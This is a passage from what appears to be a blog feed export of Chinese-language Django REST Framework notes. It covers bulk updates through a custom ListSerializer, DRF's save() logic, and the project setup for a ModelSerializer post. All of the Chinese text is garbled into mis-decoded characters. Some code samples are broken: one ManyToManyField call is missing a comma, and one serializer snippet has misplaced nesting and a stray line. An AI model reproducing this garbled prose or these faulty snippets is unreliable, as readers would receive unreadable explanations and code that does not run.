serializer.py"></a>åºåˆ—åŒ–å±‚ <code>serializer.py</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡ç‚¹ï¼šListSerializerä¸ModelSerializerå»ºç«‹å…³è”çš„æ˜¯ï¼š åœ¨ModelSerializerçš„Metaç±»ä¸­è®¾ç½®   list_serializer_class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span>  <span class="comment"># print(instance)  # è¦æ›´æ–°çš„å¯¹è±¡ä»¬</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # æ›´æ–°çš„å¯¹è±¡å¯¹åº”çš„æ•°æ®ä»¬</span></span><br><span class="line">        <span class="comment"># print(self.child)  # æœåŠ¡çš„æ¨¡å‹åºåˆ—åŒ–ç±» - V3BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V3BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            <span class="comment"># ç¾¤æ”¹ï¼Œlist_serializer_classæ˜¯å›ºå®šçš„keyå†™æ³•ï¼Œç›´æ¥è½¬å…¥BookListSerializerç±»çš„ update æ–¹æ³•</span></span><br><span class="line">            list_serializer_class = BookListSerializer</span><br></pre></td></tr></table></figure><p>ä¹‹æ‰€ä»¥éœ€è¦å®ç°<code>update</code>æ–¹æ³•ï¼Œç¾¤æ”¹æ—¶ä¼šèµ° <code>rest_framework.serializers.ListSerializer</code>ä¸­çš„<code>update</code>å‡½æ•°ï¼Œè€Œè¯¥å‡½æ•°å¹¶æœªè¢«å®ç°ã€‚</p><p>è€Œç¾¤å¢ä¸éœ€è¦é‡å†™<code>create</code>æ–¹æ³•ï¼Œå› ä¸ºæºç ä¸­<code>rest_framework.serializers.ListSerializer</code>èµ°çš„å°±æ˜¯<code>ModelSerializer</code>çš„<code>create</code>æ–¹æ³•:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        self.child.create(attrs) <span class="keyword">for</span> attrs <span class="keyword">in</span> validated_data</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h2 id="è§†å›¾å±‚-views-py"><a href="#è§†å›¾å±‚-views-py" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h2><p>åœ¨è§†å›¾å±‚å°† å•å±€éƒ¨æ”¹å’Œç¾¤å±€éƒ¨æ”¹æ•´åˆï¼Œæ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>å•å±€éƒ¨æ”¹ï¼šå¯¹ <code>v3/books/pk/</code>   <code>pk</code>é€šè¿‡è·¯ç”±ä¼ å‚ï¼Œä¿®æ”¹æ•°æ®é€‰æ‹©ä¼ å‚ï¼Œé€šè¿‡æ•°æ®åŒ…jsonä¼ é€’</li><li>ç¾¤å±€éƒ¨ä¿®æ”¹ï¼š<code>v3/books/</code> ä¿®æ”¹æ•°æ®é€šè¿‡æ•°æ®åŒ…ä¼ é€’ï¼Œè®¾ç½®æˆåˆ—è¡¨æ ¼å¼  <code>[{pk:1,name:123},{pk:3,price:7},{pk:7,publish:2}]</code></li><li>å…ˆå°†å•æ”¹ï¼Œç¾¤æ”¹çš„æ•°æ®éƒ½æ ¼å¼åŒ–æˆ <code>pks=[è¦éœ€è¦çš„å¯¹è±¡ä¸»é”®æ ‡è¯†]</code>ï¼Œ <code>request_data=[æ¯ä¸ªè¦ä¿®æ”¹çš„å¯¹è±¡å¯¹åº”çš„ä¿®æ”¹æ•°æ®]</code></li><li><code>pks</code>ä¸<code>request_data</code>æ•°æ®ç­›é€‰ï¼Œå°†<code>pks</code>ä¸­çš„æ²¡æœ‰å¯¹åº”æ•°æ®çš„<code>pk</code>ä¸æ•°æ®å·²åˆ é™¤çš„<code>pk</code>ç§»é™¤ï¼Œ<code>request_data</code>å¯¹åº”ç´¢å¼•ä½ä¸Šçš„æ•°æ®ä¹Ÿç§»é™¤ï¼Œå°†åˆç†çš„<code>pks</code>è½¬æ¢ä¸º<code>objs</code></li></ol><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></details><h1 id="ListSerializerä½¿ç”¨è¦ç‚¹å°ç»“"><a href="#ListSerializerä½¿ç”¨è¦ç‚¹å°ç»“" class="headerlink" title="ListSerializerä½¿ç”¨è¦ç‚¹å°ç»“"></a><code>ListSerializer</code>ä½¿ç”¨è¦ç‚¹å°ç»“</h1><p><code>views.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ser_obj = ModelSerializer(instance=model_obj,data=model_data,partial=<span class="literal">True</span>,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>serializer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># å®ç°ç¾¤æ”¹åŠŸèƒ½ï¼Œååºåˆ—åŒ–æƒ…å†µä¸‹çš„createã€updateå°±ä¸å†è°ƒç”¨ModelSerializerçš„</span></span><br><span class="line"><span class="comment"># è€Œæ˜¯è°ƒç”¨ ModelSerializer.Meta.list_serializer_class æŒ‡å‘çš„ ListSerializer ç±»çš„createã€update</span></span><br><span class="line"><span class="comment"># ListSerializeré»˜è®¤åªå®ç°äº†ç¾¤å¢çš„createï¼Œè¦å®ç°ç¾¤æ”¹ï¼Œå¿…é¡»é‡å†™update</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€<span class="comment">#è‡ªå®šä¹‰åºåˆ—åŒ–ç±»ï¼Œé‡å†™updateæ–¹æ³•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># print(instance)  # è¦æ›´æ–°çš„å¯¹è±¡ä»¬: [obj1, obj2, ...]</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # æ›´æ–°çš„å¯¹è±¡å¯¹åº”çš„æ•°æ®ä»¬: [&#123;&#125;, &#123;&#125;, ...]</span></span><br><span class="line">        <span class="comment"># print(self.child)  # æœåŠ¡çš„æ¨¡å‹åºåˆ—åŒ–ç±» - V2BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            list_serializer_class = MyListSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†ä¸¤è€…ç±»å»ºç«‹å…³è”ï¼Œåœ¨MyListSerializerä¸­å°±å¯ä»¥ç”¨self.childæ‹¿åˆ°# MyModelSerializerï¼Œè¿›è€Œä½¿ç”¨MyModelSerializerä¸­å°è£…å¥½çš„æ–¹æ³•</span></span><br><span class="line">    cls.Meta.list_serializer_class.child = cls</span><br></pre></td></tr></table></figure><h1 id="æºç è¡¥å……åˆ†æ"><a href="#æºç è¡¥å……åˆ†æ" class="headerlink" title="æºç è¡¥å……åˆ†æ"></a>æºç è¡¥å……åˆ†æ</h1><p>åˆ†æä¸€ä¸‹ä¿®æ”¹ä¸ºä»€ä¹ˆè¦ç”¨<code>instance</code>ä¼ å‚ã€‚</p><p>ä¿®æ”¹ä¹‹åæ•°æ®ä½¿ç”¨<code>save()</code>ä¿å­˜ï¼Œä»è§†å›¾çš„<code>save()</code>ç‚¹å‡»è¿›å»æŸ¥çœ‹æºç ï¼Œä¸‹é¢æ˜¯<code>BaseSerializer</code>ç±»ä¸­çš„<code>save</code>ï¼Œè€Œè¯¥<code>save</code>æœªè¢«å®ç°ã€‚</p><p>å› æ­¤æ¥ç€æŸ¥çœ‹<code>save</code>æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    validated_data = [</span><br><span class="line">        dict(list(attrs.items()) + list(kwargs.items()))</span><br><span class="line">        <span class="keyword">for</span> attrs <span class="keyword">in</span> self.validated_data</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        self.instance = self.update(self.instance, validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`update()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.instance = self.create(validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`create()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.instance</span><br></pre></td></tr></table></figure><p><code>instance</code>å­˜åœ¨å°±èµ°<code>update</code>æ–¹æ³•ï¼Œä¿®æ”¹æ•°æ®(<code>PUT</code>/<code>PATCH</code>)æ—¶éƒ½åº”ä¼ å…¥<code>instance</code>ï¼Œæ‰€ä»¥å•æ”¹ç¾¤æ”¹éƒ½éœ€è¦ä¼ å…¥<code>data</code>ï¼ˆååºåˆ—åŒ–ç”¨ï¼‰å’Œ<code>instance</code>ï¼ˆåºåˆ—åŒ–ç”¨ï¼‰å‚æ•°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆå…«ï¼‰ï¼šåºåˆ—åŒ–æ¨¡å— serialziers ä¹‹ ModelSerializerç±»</title>
      <link href="/tech/drf-learning-notes-8-the-modelserializer-class-in-serialziers-module/"/>
      <url>/tech/drf-learning-notes-8-the-modelserializer-class-in-serialziers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (8): the ModelSerializer class in serialziers module</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li><li>å®˜æ–¹æ–‡æ¡£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzhfZHJmX01vZGVsU2VyaWFsaXplcg==">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><p>DRFå¸¸ç”¨åºåˆ—åŒ–ç±»ä¸»è¦æœ‰</p><ul><li><code>rest_framework.serialziers.Serializer</code></li><li><code>rest_framework.serialziers.ModelSerializer</code></li><li><code>rest_framework.serialziers.ListSerializer</code></li></ul><p>æœ¬ç¯‡ä»‹ç»<code>rest_framework.serialziers.ModelSerializer</code> ï¼Œå°†ç»“åˆå›¾ä¹¦ç®¡ç†ç³»ç»Ÿå®ä¾‹è¯´æ˜ã€‚</p><a id="more"></a><h1 id="åºåˆ—åŒ–ä»¥å¤–çš„å…¶ä»–é…ç½®"><a href="#åºåˆ—åŒ–ä»¥å¤–çš„å…¶ä»–é…ç½®" class="headerlink" title="åºåˆ—åŒ–ä»¥å¤–çš„å…¶ä»–é…ç½®"></a>åºåˆ—åŒ–ä»¥å¤–çš„å…¶ä»–é…ç½®</h1><h2 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a><code>settings.py</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)</span><br></pre></td></tr></table></figure><h2 id="å…¨å±€url-py"><a href="#å…¨å±€url-py" class="headerlink" title="å…¨å±€url.py"></a>å…¨å±€<code>url.py</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.conf.urls.static <span class="keyword">import</span> static</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'admin/'</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">'api/'</span>, include(<span class="string">'api.urls'</span>)),</span><br><span class="line">] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®åº“è¡¨"><a href="#æ•°æ®åº“è¡¨" class="headerlink" title="æ•°æ®åº“è¡¨"></a>æ•°æ®åº“è¡¨</h2><h3 id="è¡¨ä¸€è§ˆ"><a href="#è¡¨ä¸€è§ˆ" class="headerlink" title="è¡¨ä¸€è§ˆ"></a>è¡¨ä¸€è§ˆ</h3><ul><li><code>BaseModel</code>åŸºè¡¨ï¼š<code>is_delete</code>ã€<code>create_time</code></li></ul><p>ä¸‹é¢å››è¡¨ç»§æ‰¿åŸºè¡¨ï¼Œå¯ä»¥ç»§æ‰¿ä¸¤ä¸ªå­—æ®µ</p><ul><li><code>Book</code>è¡¨ï¼š<code>name</code>ã€<code>price</code>ã€<code>img</code>ã€<code>authors</code>ã€<code>publish</code>ã€<code>is_delete</code>ã€<code>create_time</code></li><li><code>Publish</code>è¡¨ï¼š<code>name</code>ã€<code>address</code>ã€<code>is_delete</code>ã€<code>create_time</code></li><li><code>Authorè¡¨</code>ï¼š<code>name</code>ã€<code>age</code>ã€<code>is_delete</code>ã€<code>create_time</code></li><li><code>AuthorDetail</code>è¡¨ï¼š<code>mobile, author</code>ã€<code>is_delete</code>ã€<code>create_time</code></li></ul><h3 id="åŸºè¡¨ä»£ç "><a href="#åŸºè¡¨ä»£ç " class="headerlink" title="åŸºè¡¨ä»£ç "></a>åŸºè¡¨ä»£ç </h3><p><code>models.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½® abstract = True æ¥å£°æ˜åŸºè¡¨ï¼Œä½œä¸ºåŸºè¡¨çš„Modelä¸èƒ½åœ¨æ•°æ®åº“ä¸­å½¢æˆå¯¹åº”çš„è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span></span><br></pre></td></tr></table></figure><h3 id="æ–­å…³è”å¤šè¡¨å…³ç³»ï¼ˆé‡ç‚¹ï¼‰"><a href="#æ–­å…³è”å¤šè¡¨å…³ç³»ï¼ˆé‡ç‚¹ï¼‰" class="headerlink" title="æ–­å…³è”å¤šè¡¨å…³ç³»ï¼ˆé‡ç‚¹ï¼‰"></a>æ–­å…³è”å¤šè¡¨å…³ç³»ï¼ˆé‡ç‚¹ï¼‰</h3><ol><li><p>å¤–é”®ä½ç½®ï¼š</p><ul><li>ä¸€å¯¹å¤šï¼šå¤–é”®æ”¾å¤šçš„ä¸€æ–¹</li><li>ä¸€å¯¹ä¸€ï¼šä»é€»è¾‘æ­£åå‘è€ƒè™‘ï¼Œå¦‚ä½œè€…è¡¨ä¸ä½œè€…è¯¦æƒ…è¡¨ï¼Œä½œè€…åˆ é™¤çº§è”ä½œè€…è¯¦æƒ…ä¹Ÿåˆ é™¤ï¼Œè¯¦æƒ…åˆ é™¤ä½œè€…ä¾æ—§å­˜åœ¨ï¼Œæ‰€ä»¥å»ºè®®å¤–é”®åœ¨è¯¦æƒ…è¡¨ä¸­ï¼ˆå’Œä¹‹å‰çš„ä¸€å¯¹ä¸€å…³ç³»å¤–é”®æ”¾ç½®ä¸ä¸€æ ·ï¼Œä¹‹å‰éƒ½æ˜¯æŠŠå¤–é”®æ”¾åœ¨æŸ¥è¯¢é¢‘ç‡é«˜çš„è¡¨ï¼‰</li><li>å¤šå¯¹å¤šï¼šå¤–é”®åœ¨å…³ç³»è¡¨ä¸­</li></ul></li><li><p>ORMæ­£å‘æ–¹å‘è¿è¡¨æŸ¥æ‰¾ï¼š(æ³¨ï¼šä¾èµ–ä»£ç è§ä¸‹æ–¹)</p><ul><li>æ­£å‘ï¼šé€šè¿‡å¤–é”®å­—æ®µ eg: <code>author_detial_obj.author</code>ï¼Œå¤–é”®è®¾ç½®åœ¨ä½œè€…è¯¦æƒ…è¡¨ï¼Œåœ¨ä½œè€…è¯¦æƒ…è¡¨ä¸­æŸ¥è¯¢ä½œè€…ç›´æ¥<code>.author</code>å°±å¯ä»¥</li><li>åå‘ï¼šé€šè¿‡è®¾ç½®åå‘æŸ¥è¯¢<code>related_name</code>çš„å€¼ egï¼š<code>author_obj.detail</code>ï¼Œå¤–é”®æ²¡æœ‰è®¾ç½®åœ¨ä½œè€…è¡¨ä¸­ï¼Œåœ¨ä½œè€…è¡¨ä¸­é€šè¿‡è®¾ç½®åå‘æŸ¥è¯¢<code>.detail</code>æŸ¥è¯¢ä½œè€…è¯¦æƒ…</li></ul></li><li><p>è¿è¡¨æ“ä½œå…³ç³»ï¼šï¼ˆæ³¨ï¼šæ‹¿ä½œè€…ä¸ä½œè€…è¯¦æƒ…è¡¨ä¸¾ä¾‹ï¼Œå¤–é”®å»ºåœ¨ä½œè€…è¯¦æƒ…è¡¨ä¸­ï¼‰</p><ul><li>ä½œè€…åˆ é™¤ï¼Œè¯¦æƒ…çº§è”   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">on_delete=models.CASCADE    <span class="comment">#è·Ÿç€ä¸€èµ·åˆ é™¤</span></span><br></pre></td></tr></table></figure></li><li>ä½œè€…åˆ é™¤ï¼Œè¯¦æƒ…ç½®ç©º   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">null=<span class="literal">True</span>, on_delete=models.SET_NULL   <span class="comment">#å¤–é”®å­—æ®µæ¸…ç©º</span></span><br></pre></td></tr></table></figure></li><li>ä½œè€…åˆ é™¤ï¼Œè¯¦æƒ…é‡ç½®   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default=<span class="number">0</span>, on_delete=models.SET_DEFAULT</span><br></pre></td></tr></table></figure></li><li>ä½œè€…åˆ é™¤ï¼Œè¯¦æƒ…ä¸åŠ¨   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">on_delete=models.DO_NOTHING</span><br></pre></td></tr></table></figure></li></ul></li><li><p>å¤–é”®å…³è”å­—æ®µçš„å‚æ•°ï¼šå¦‚ä½•å®ç°æ–­å…³è”ã€ç›®å‰è¡¨é—´æ“ä½œå…³ç³»ã€æ–¹å‘æŸ¥è¯¢å­—æ®µ</p><ol><li>ä½œè€…è¯¦æƒ…è¡¨ä¸­çš„ï¼ˆå¤–é”®è®¾ç½®åœ¨ä½œè€…è¯¦æƒ…è¡¨ä¸­ï¼‰  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">author = models.OneToOneField(</span><br><span class="line">    to=<span class="string">'Author'</span>,       <span class="comment">#å’Œä½œè€…è¡¨å…³è”</span></span><br><span class="line">    related_name=<span class="string">'detail'</span>,   <span class="comment">#åæŸ¥è¯¢ï¼Œä½œè€…è¡¨ç›´æ¥æŸ¥ä½œè€…è¯¦æƒ…è¡¨çš„ç”µè¯å·ç ï¼Œå¯ä»¥ç›´æ¥author_obj.detail.mobile</span></span><br><span class="line">    db_constraint=<span class="literal">False</span>,     <span class="comment">#æ–­å…³è”</span></span><br><span class="line">    on_delete=models.CASCADE  <span class="comment">#çº§è”åˆ é™¤</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li>å›¾ä¹¦è¡¨ä¸­çš„  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">publish = models.ForeignKey(</span><br><span class="line">    to=<span class="string">'Publish'</span>,</span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">    on_delete=models.DO_NOTHING,</span><br><span class="line">)</span><br><span class="line">authors = models.ManyToManyField(</span><br><span class="line">    to=<span class="string">'Author'</span></span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li></ol></li></ol><div class="note warning">            <p>æ³¨æ„ï¼š</p><ul><li><code>ManyToManyField</code>ä¸èƒ½è®¾ç½®<code>on_delete</code></li><li><code>OneToOneField</code>ã€<code>ForeignKey</code>å¿…é¡»è®¾ç½®<code>on_delete</code>ï¼ˆdjango1.xç³»ç»Ÿé»˜è®¤çº§è”ï¼Œä½†æ˜¯django2.xå¿…é¡»æ‰‹åŠ¨æ˜ç¡®ï¼‰</li></ul>          </div><h3 id="å„è¡¨ä»£ç "><a href="#å„è¡¨ä»£ç " class="headerlink" title="å„è¡¨ä»£ç "></a>å„è¡¨ä»£ç </h3><details><summary> models.py </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)  <span class="comment"># é»˜è®¤ä¸æ˜¯åˆ 